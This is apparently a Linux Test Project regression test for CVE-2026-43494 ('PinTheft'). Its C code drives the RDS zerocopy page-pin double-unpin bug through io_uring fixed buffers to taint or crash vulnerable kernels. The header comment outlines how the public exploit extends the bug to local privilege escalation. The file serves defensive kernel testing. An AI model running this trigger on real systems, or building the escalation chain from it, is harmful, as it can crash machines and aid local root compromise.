// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (C) 2026 SUSE LLC Sebastian Chlad <sebastian.chlad@suse.com>
 */

/*\
 * CVE-2026-43494
 *
 * Test for PinTheft, fixed by:
 * e17492979319 ("net/rds: reset op_nents when zerocopy page pin fails").
 *
 * The bug is in the RDS zerocopy send error path. When RDS pins user pages for
 * zerocopy send and a later page faults, the error cleanup can drop references
 * for pages that are later released again during RDS message cleanup. This
 * corrupts page reference accounting.
 *
 * The public exploit combines this RDS reference-counting bug with io_uring
 * fixed buffers and cloned buffer registrations to turn stale page references
 * into a page-cache overwrite and local privilege escalation.
 *
 * This test does not attempt privilege escalation. It triggers the underlying
 * RDS zerocopy failure path by sending GUP_PIN_COUNTING_BIAS (1024) two-page
 * iovecs where the first page is registered as an io_uring fixed buffer and
 * the second page is PROT_NONE.  Each failing send steals one FOLL_PIN
 * reference; after 1024 sends the io_uring-held page pin is exhausted.
 * Unregistering the fixed buffers on a vulnerable kernel then tries to unpin
 * a page with no remaining FOLL_PIN references, triggering a kernel WARN or
 * BUG_ON and tainting the kernel.
 *
 * Vulnerable kernels may crash, taint, panic, or hang during sendmsg() or
 * subsequent cleanup. Run only on disposable systems.
 *
 * Reproducer is based on:
 * https://github.com/v12-security/pocs/tree/main/pintheft
 */

#include <stdint.h>

#include "tst_test.h"
#include "lapi/io_uring.h"
#include "lapi/rds.h"
#include "lapi/socket.h"

#define CLEANUP_WAIT_SECS	10
#define RSS_CHECK_CHILDREN	8
#define RSS_CHECK_SIZE		(16 * 1024 * 1024)

/* Matches mm/gup.c: FOLL_PIN adds this bias to the page refcount. */
#define GUP_PIN_COUNTING_BIAS	1024

static int ring_fd1 = -1;
static int ring_fd2 = -1;
static int rds_fd = -1;
static long page_size;
static void *mapped_pages;

/* Inspired by liburing's io_uring_clone_buffers(), but using raw ring fds. */
static int clone_buffers(int dst_fd, int src_fd)
{
	struct io_uring_clone_buffers clone;

	memset(&clone, 0, sizeof(clone));
	clone.src_fd = src_fd;

	return io_uring_register(dst_fd, IORING_REGISTER_CLONE_BUFFERS,
				 &clone, 1);
}

static void setup(void)
{
	struct io_uring_params params = {};
	struct iovec fixed_iov;
	int val;

	page_size = SAFE_SYSCONF(_SC_PAGESIZE);
	io_uring_setup_supported_by_kernel();

	/*
	 * The exploit primitive keeps one fixed-buffer registration alive and
	 * clones it to another ring. The child runs the FOLL_PIN drain loop;
	 * run() unregisters the buffers afterwards to trigger the double-unpin
	 * WARN/BUG_ON on vulnerable kernels.
	 */
	ring_fd1 = io_uring_setup(1, &params);
	if (ring_fd1 < 0)
		tst_brk(TBROK | TERRNO, "io_uring_setup() failed for first ring");

	memset(&params, 0, sizeof(params));

	ring_fd2 = io_uring_setup(1, &params);
	if (ring_fd2 < 0)
		tst_brk(TBROK | TERRNO, "io_uring_setup() failed for second ring");

	rds_fd = socket(AF_RDS, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
	if (rds_fd < 0) {
		if (errno == EAFNOSUPPORT)
			tst_brk(TCONF | TERRNO, "RDS is not available");

		tst_brk(TBROK | TERRNO, "socket(AF_RDS) failed");
	}

	/* PinTheft uses the RDS TCP transport, so base RDS is not enough. */
	val = RDS_TRANS_TCP;
	TEST(setsockopt(rds_fd, SOL_RDS, SO_RDS_TRANSPORT, &val, sizeof(val)));

	if (TST_RET) {
		if (TST_ERR == ENOPROTOOPT || TST_ERR == EINVAL)
			tst_brk(TCONF | TERRNO, "RDS TCP transport is not available");

		tst_brk(TBROK | TERRNO, "setsockopt(SO_RDS_TRANSPORT) failed");
	}

	/*
	 * Allocate two adjacent pages: the first one will be pinned as an
	 * io_uring fixed buffer, and the second one will be made inaccessible.
	 */
	mapped_pages = SAFE_MMAP(NULL, 2 * page_size, PROT_READ | PROT_WRITE,
				 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	memset(mapped_pages, 0xa5, page_size);

	/*
	 * RDS should successfully pin the first page, then fault on the second.
	 * That fault drives the buggy zerocopy error cleanup path.
	 */
	SAFE_MPROTECT((char *)mapped_pages + page_size, page_size, PROT_NONE);

	fixed_iov.iov_base = mapped_pages;
	fixed_iov.iov_len = page_size;

	/*
	 * Register only the first page as an io_uring fixed buffer. This creates
	 * the long-term page pin whose reference accounting the RDS bug damages.
	 */
	if (io_uring_register(ring_fd1, IORING_REGISTER_BUFFERS, &fixed_iov, 1))
		tst_brk(TBROK | TERRNO, "IORING_REGISTER_BUFFERS failed");

	/*
	 * Clone the fixed buffer registration into the second ring, matching the
	 * public reproducer's lifetime pattern without performing the later
	 * page-cache overwrite stage.
	 */
	if (clone_buffers(ring_fd2, ring_fd1)) {
		if (errno == EINVAL || errno == EOPNOTSUPP)
			tst_brk(TCONF | TERRNO, "IORING_REGISTER_CLONE_BUFFERS is not supported");

		tst_brk(TBROK | TERRNO, "IORING_REGISTER_CLONE_BUFFERS failed");
	}
}

static void trigger(void)
{
	struct sockaddr_in bind_addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
		.sin_port = 0,
	};
	struct sockaddr_in dst_addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	char control[CMSG_SPACE(sizeof(uint32_t))];
	struct cmsghdr *cmsg;
	struct iovec iov = {
		.iov_base = mapped_pages,
		.iov_len = 2 * page_size,
	};
	struct msghdr msg = {
		.msg_name = &dst_addr,
		.msg_namelen = sizeof(dst_addr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	int ret;
	int val;
	int i, efaults, first_bad_errno = 0;

	/* Mirror the public PoC trigger: RDS zerocopy over TCP. */
	val = 1;
	if (setsockopt(rds_fd, SOL_SOCKET, SO_ZEROCOPY, &val, sizeof(val))) {
		if (errno == ENOPROTOOPT || errno == EINVAL)
			tst_brk(TCONF | TERRNO, "SO_ZEROCOPY not supported on RDS sockets");
		tst_brk(TBROK | TERRNO, "setsockopt(SO_ZEROCOPY) failed");
	}

	val = 2 * page_size * 4;
	SAFE_SETSOCKOPT(rds_fd, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val));

	/*
	 * Bind to a kernel-assigned loopback port and send to the next port
	 * (unbound). The sends are expected to fail before any useful delivery;
	 * the faulting iovec is the interesting part.
	 */
	SAFE_BIND(rds_fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
	dst_addr.sin_port = htons(TST_GETSOCKPORT(rds_fd) + 1);

	memset(control, 0, sizeof(control));
	cmsg = (struct cmsghdr *)control;
	cmsg->cmsg_level = SOL_RDS;
	cmsg->cmsg_type = RDS_CMSG_ZCOPY_COOKIE;
	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));

	/*
	 * Each send pins page 0, faults on page 1 (PROT_NONE), and on a
	 * vulnerable kernel double-drops page 0's reference. EFAULT is the
	 * expected error; other errors do not count as successful steals.
	 * Loop until GUP_PIN_COUNTING_BIAS EFAULTs are collected or 10x that
	 * many attempts have been made, giving margin when some iterations do
	 * not trigger EFAULT.
	 */
	for (i = 0, efaults = 0;
	     efaults < GUP_PIN_COUNTING_BIAS && i < 10 * GUP_PIN_COUNTING_BIAS;
	     i++) {
		/* rds_cmsg_zcopy() in net/rds/send.c */
		*(uint32_t *)CMSG_DATA(cmsg) = (uint32_t)i;

		ret = sendmsg(rds_fd, &msg, MSG_ZEROCOPY | MSG_DONTWAIT);
		if (ret >= 0)
			tst_brk(TBROK, "sendmsg() unexpectedly succeeded at iter %d", i);

		if (errno == EFAULT)
			efaults++;
		else if (!first_bad_errno)
			first_bad_errno = errno;
	}

	if (first_bad_errno) {
		tst_res(TINFO, "sendmsg() returned unexpected errno %d (%s) on at least one iteration",
			first_bad_errno, tst_strerrno(first_bad_errno));
	}

	tst_res(TINFO, "Completed %d/%d sendmsg() attempts with EFAULT",
		efaults, GUP_PIN_COUNTING_BIAS);

	if (efaults == 0)
		tst_brk(TCONF, "sendmsg() never returned EFAULT - GUP pin path not exercised");

	if (efaults < GUP_PIN_COUNTING_BIAS)
		tst_res(TWARN, "Only %d/%d sends returned EFAULT - FOLL_PIN counter may not be fully drained",
			efaults, GUP_PIN_COUNTING_BIAS);
}

static void poke_rss_accounting(void)
{
	char *mem;

	mem = SAFE_MMAP(NULL, RSS_CHECK_SIZE, PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	memset(mem, 0x5a, RSS_CHECK_SIZE);
	SAFE_MUNMAP(mem, RSS_CHECK_SIZE);
}

static void run(void)
{
	pid_t pid;
	int i;

	/*
	 * Run the dangerous part in a child so that process teardown can expose
	 * delayed RSS/page-accounting damage before the parent reports TPASS.
	 */
	pid = SAFE_FORK();
	if (!pid) {
		trigger();
		exit(0);
	}

	tst_reap_children();

	/*
	 * Unregistering fixed buffers after FOLL_PIN has been drained triggers
	 * the double-unpin WARN/BUG_ON on vulnerable kernels.
	 */
	io_uring_register(ring_fd2, IORING_UNREGISTER_BUFFERS, NULL, 0);
	io_uring_register(ring_fd1, IORING_UNREGISTER_BUFFERS, NULL, 0);

	if (tst_taint_check()) {
		tst_res(TFAIL, "Kernel is vulnerable: tainted after buffer unregistration");
		return;
	}

	/*
	 * The visible failure can be delayed until another mm is torn down.
	 * Fork all RSS children in parallel, then reap and check taint once.
	 */
	for (i = 0; i < RSS_CHECK_CHILDREN; i++) {
		pid = SAFE_FORK();
		if (!pid) {
			poke_rss_accounting();
			exit(0);
		}
	}

	tst_reap_children();

	if (tst_taint_check()) {
		tst_res(TFAIL, "Kernel is vulnerable: tainted during RSS accounting checks");
		return;
	}

	/*
	 * RDS/page cleanup can run asynchronously after userspace returns from
	 * sendmsg() and after file descriptors are closed. Wait before declaring
	 * that the kernel merely "seems" to have survived.
	 */
	for (i = 0; i < CLEANUP_WAIT_SECS; i++) {
		sleep(1);

		if (tst_taint_check()) {
			tst_res(TFAIL, "Kernel is vulnerable: tainted during RDS zerocopy cleanup");
			return;
		}
	}

	tst_res(TPASS, "Kernel seems to have survived RDS zerocopy cleanup");
}

static void cleanup(void)
{
	if (ring_fd2 >= 0) {
		io_uring_register(ring_fd2, IORING_UNREGISTER_BUFFERS, NULL, 0);
		SAFE_CLOSE(ring_fd2);
	}

	if (ring_fd1 >= 0) {
		io_uring_register(ring_fd1, IORING_UNREGISTER_BUFFERS, NULL, 0);
		SAFE_CLOSE(ring_fd1);
	}

	if (rds_fd >= 0)
		SAFE_CLOSE(rds_fd);

	if (mapped_pages) {
		SAFE_MUNMAP(mapped_pages, 2 * page_size);
		mapped_pages = NULL;
	}
}

static struct tst_test test = {
	.test_all = run,
	.setup = setup,
	.cleanup = cleanup,
	.timeout = 60,
	.forks_child = 1,
	.taint_check = TST_TAINT_W | TST_TAINT_D,
	.needs_kconfigs = (const char *[]) {
		"CONFIG_RDS",
		"CONFIG_RDS_TCP",
		"CONFIG_IO_URING",
		NULL
	},
	.save_restore = (const struct tst_path_val[]) {
		{"/proc/sys/kernel/io_uring_disabled", "0",
			TST_SR_SKIP_MISSING | TST_SR_TCONF_RO},
		{}
	},
	.tags = (const struct tst_tag[]) {
		{"linux-git", "e17492979319"},
		{"CVE", "2026-43494"},
		{}
	}
};
